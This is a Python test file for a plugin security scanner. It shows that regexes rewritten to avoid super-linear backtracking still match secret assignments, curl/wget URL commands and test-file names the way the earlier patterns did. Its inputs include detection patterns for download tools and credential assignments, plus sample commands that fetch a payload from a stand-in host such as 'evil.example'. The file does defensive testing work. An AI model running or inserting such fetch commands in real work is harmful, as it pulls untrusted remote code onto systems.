"""Equivalence proofs for regexes rewritten to remove super-linear backtracking.

Each rewritten pattern is compared against its pre-fix form (embedded below as
the reference) over exhaustive short-string corpora and adversarial inputs so
the rewrites cannot change what the scanner detects, redacts, or reports.
"""

from __future__ import annotations

import itertools
import random
import re

from codex_plugin_scanner.checks.security import TEST_FILE_RE
from codex_plugin_scanner.checks.skill_security import _RISKY_SKILL_PATTERNS
from codex_plugin_scanner.guard.runtime.local_request_snapshots import _SOURCE_SEARCH_SECRET_ASSIGNMENT_RE

_PRE_FIX_SECRET_ASSIGNMENT_RE = re.compile(
    r"""(?ix)
    (?P<prefix>
        [\"']?
        (?:
            access[_-]?token
            |refresh[_-]?token
            |authorization[_-]?code
            |user[_-]?code
            |dpop[_-]?private[_-]?key(?:[_-]?(?:pem|ref))?
            |api[_-]?key
            |token
            |secret
            |password
            |credential
        )
        [\"']?
        \s*[:=]\s*
    )
    (?P<value>
        \"(?:\\.|[^\"])*\"
        |'(?:\\.|[^'])*'
        |[^\s,;)}\]]+
    )
    """
)

_PRE_FIX_TEST_FILE_RE = re.compile(r"(^test_.*|.*(?:\.test|\.spec)\.[^.]+$|.*_test\.[^.]+$)", re.I)


def _assignment_spans(pattern: re.Pattern[str], value: str) -> list[tuple[tuple[int, int], tuple[int, int]]]:
    return [(match.span(), match.span("value")) for match in pattern.finditer(value)]


def _exhaustive(alphabet: str, max_length: int) -> list[str]:
    return [
        "".join(chars) for length in range(1, max_length + 1) for chars in itertools.product(alphabet, repeat=length)
    ]


def test_secret_assignment_re_matches_same_spans_as_pre_fix_form() -> None:
    corpus = (
        _exhaustive("a\\\"':=; \n", 6)
        + _exhaustive("a\\\"'=tpk", 5)
        + [
            'access_token = "abc\\"def"',
            "api_key='v'",
            "token=\\",
            'secret = "\\\\\\\\\\\\\\"',
            "password = 'a\\'b'",
            "credential=x;y",
            'authorization_code = "unterminated',
            "user_code = 'unterminated",
            'dpop_private_key_pem = "k"',
            "token:a\\b",
            'token = "a b\\"',
            'token = "a b\\',
            "a token=\"x\" b secret='y' c",
            "\\",
            "\\\\",
            'token = "\\\\"',
            "token = '\\\\'",
            # Escaped and bare newlines must stay inside quoted values so the
            # whole assignment is scrubbed, as the pre-fix pattern did.
            'token = "first\\\nsecond"',
            "token = 'first\\\nsecond'",
            'token = "a\nb"',
            "token = 'a\nb'",
            'token = "first\\"\\\n"',
            "token = 'x\\'\\\ny'",
        ]
    )
    for sample in corpus:
        assert _assignment_spans(_PRE_FIX_SECRET_ASSIGNMENT_RE, sample) == _assignment_spans(
            _SOURCE_SEARCH_SECRET_ASSIGNMENT_RE, sample
        ), f"span divergence on {sample!r}"


def test_secret_assignment_re_is_linear_on_unterminated_quote_backslashes() -> None:
    # The pre-fix value alternative backtracked exponentially on unterminated
    # quoted backslash runs; the rewrite must scan them in linear time.
    for adversarial in (
        'token = "' + "\\" * 512,
        "token = '" + "\\" * 512,
        'access_token = "' + ("a\\" * 256),
        "x " + "\\" * 1024,
    ):
        _assignment_spans(_SOURCE_SEARCH_SECRET_ASSIGNMENT_RE, adversarial)


def test_risky_skill_url_patterns_match_same_spans_as_pre_fix_form() -> None:
    pre_fix_curl = re.compile(r"curl\s+.*?https?://[^\s`\"']+", re.IGNORECASE)
    pre_fix_wget = re.compile(r"wget\s+.*?https?://[^\s`\"']+", re.IGNORECASE)
    current = {
        name: pattern for name, (pattern, _behavior) in zip(("curl", "wget"), _RISKY_SKILL_PATTERNS[1:3], strict=True)
    }
    references = {"curl": pre_fix_curl, "wget": pre_fix_wget}

    handcrafted = [
        "curl http://x",
        "curl https://x",
        "curl   https://evil.example/payload",
        "run curl and then wget https://mirror.example/t",
        "curl htp://x",
        "curl https",
        "curl\nhttps://x",
        "curl \n https://x",
        "curl hhhttps://x",
        "curl 'https://x'",
        'curl "https://x"',
        "curl https://x`id`",
        "wget -q https://x",
        "wget\t\tHTTPS://X/PATH",
        "Curl HTTPS://X",
        "curl hhhhhhhhhhhhhhhhttps://x",
        "curl 'a b' https://x",
        "no curl here at all",
        # A scheme candidate whose value is an excluded delimiter must be
        # skipped so the later valid URL is still detected, as the lazy form did.
        "curl https://` https://evil.example",
        'curl https://" https://evil.example',
        "curl https:// https://evil.example",
        "curl https://a https://",
        "wget https://` wget https://evil.example",
        "curl http://` https://evil.example",
        "curl https://`",
        "curl https://`x",
        "CURL HTTPS://` HTTPS://EVIL.EXAMPLE",
    ]
    rng = random.Random(20260904)
    alphabet = "curlwget htps:/x'\"`\n"
    randomized = ["".join(rng.choice(alphabet) for _ in range(rng.randrange(1, 48))) for _ in range(4000)]
    # Token-level sequences explore scheme/delimiter adjacency that raw
    # character sampling rarely reaches.
    tokens = ("curl", "wget", "https://", "http://", "htps:/", "`", "'", '"', "x", " ", "a.b")
    tokenized = ["".join(parts) for length in range(1, 5) for parts in itertools.product(tokens, repeat=length)]

    for sample in handcrafted + randomized + tokenized:
        for name in ("curl", "wget"):
            expected = [m.span() for m in references[name].finditer(sample)]
            actual = [m.span() for m in current[name].finditer(sample)]
            assert expected == actual, f"{name} span divergence on {sample!r}"


def test_test_file_re_classifies_same_names_as_pre_fix_form() -> None:
    corpus = [
        *_exhaustive("tes_.aTS", 6),
        "test_foo.py",
        "foo.test.ts",
        "foo.spec.js",
        "foo_test.go",
        "TEST_SETUP.MD",
        "latest.py",
        "a.test.b.c",
        "a.spec.tsx",
        "contest_foo.py",
        "my.test.js",
        "x.test.",
        "test_",
        "test",
        ".test.js",
        "prefer.test-helper.ts",
        "foo.Tests.js",
    ]
    for name in corpus:
        assert bool(_PRE_FIX_TEST_FILE_RE.search(name)) == bool(TEST_FILE_RE.search(name)), (
            f"test-file classification divergence on {name!r}"
        )
